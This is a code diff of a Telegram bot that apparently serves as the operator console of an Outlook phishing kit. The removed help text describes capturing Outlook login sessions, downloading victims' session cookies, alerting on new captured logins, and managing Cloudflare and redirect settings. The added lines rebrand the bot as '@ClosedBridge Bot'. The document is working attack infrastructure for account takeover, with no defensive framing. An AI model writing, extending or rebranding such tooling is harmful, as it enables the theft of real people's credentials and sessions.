@@ -122,13 +122,8 @@ class OutlookNotificationBot {
 
     sendMainMenu(chatId) {
         const welcomeMessage = `
-🚀 **Welcome to Outlook Automation Bot!**
-
-Choose an option from the menu below:
-
-🔧 **Admin Features:**
-• Admin Panel - Access admin token and management URL
-• Server Control - Monitor and control your VPS server
+/////// POWERED BY CLOSEDBRIDGE /////////
+🚀 **Welcome to @ClosedBridge  Bot!**
 
 ❓ **Help:**
 • Help - Get information about available commands and features
@@ -161,22 +156,8 @@ Choose an option from the menu below:
 
     sendHelpMessage(chatId) {
         const helpMessage = `
-❓ **Outlook Automation Bot Help**
-
-**Available Features:**
-
-🔧 **Admin Features**
-• **Admin Panel**: Access admin token and management interface
-  - View captured login sessions
-  - Download session cookies and data
-  - Monitor system analytics
-  - Configure system settings
-
-📧 **Notifications**
-• **Real-time Login Alerts**: Get notified when new Outlook logins are captured
-  - Email addresses and domains
-  - Session information
-  - Direct links to admin panel
+/////// POWERED BY CLOSEDBRIDGE /////////
+❓ @ClosedBridge  Bot Help
 
 **Commands:**
 • **/start** - Show main menu
@@ -286,18 +267,6 @@ This bot provides notifications and admin access for the Outlook automation proj
 🌐 <b>Admin Panel URL:</b>
 ${adminUrl}
 
-<b>How to use:</b>
-1. Copy the token above
-2. Click "Open Admin Panel" below
-3. Enter the token to authenticate
-4. Access all admin features and session data
-
-<b>Features Available:</b>
-• View all captured login sessions
-• Download session cookies and data
-• Monitor system analytics
-• Configure Cloudflare settings
-• Manage redirect destinations
 
 🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
         `;
